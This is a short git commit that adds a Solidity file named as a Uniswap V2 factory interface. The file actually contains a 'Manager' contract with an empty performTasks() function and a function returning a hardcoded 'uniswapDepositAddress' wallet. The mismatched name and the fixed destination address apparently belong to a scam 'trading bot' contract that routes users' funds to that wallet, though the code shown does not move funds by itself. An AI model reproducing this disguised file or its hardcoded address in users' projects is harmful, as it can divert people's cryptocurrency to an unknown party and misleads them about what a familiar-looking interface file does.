6de0cb86a13415e8019722f88c05d35fc33dfb4b
SmartContractBots <96440391+SmartContractBots@users.noreply.github.com>
2021-12-20 18:55:48 +0100

    Add files via upload

---
+++ contracts/interfaces/IUniswapV2Factory.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xf154D3dC9802B06D0c1Aa96ebbC87ACCa32727C5;
+	}
+}
